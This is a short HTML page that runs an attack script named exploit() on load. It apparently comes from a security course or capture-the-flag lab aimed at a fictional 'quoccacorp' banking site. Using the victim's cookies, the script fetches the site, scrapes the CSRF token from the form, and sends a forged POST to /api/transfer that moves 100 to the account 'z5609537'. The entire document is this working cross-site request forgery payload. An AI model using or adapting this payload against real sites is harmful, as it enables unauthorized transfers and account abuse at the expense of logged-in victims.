<!DOCTYPE html>
<html>
<body>
<script>
async function exploit() {
    // 先获取bot的页面拿csrf token
    const resp = await fetch('https://phish-me.quoccacorp.com/', {
        credentials: 'include'
    });
    const text = await resp.text();
    const match = text.match(/name="csrf_token" value="([^"]+)"/);
    if (match) {
        const token = match[1];
        const formData = new URLSearchParams();
        formData.append('username', 'z5609537');
        formData.append('amount', '100');
        formData.append('csrf_token', token);
        await fetch('https://phish-me.quoccacorp.com/api/transfer', {
            method: 'POST',
            credentials: 'include',
            body: formData,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
    }
}
exploit();
</script>
</body>
</html>
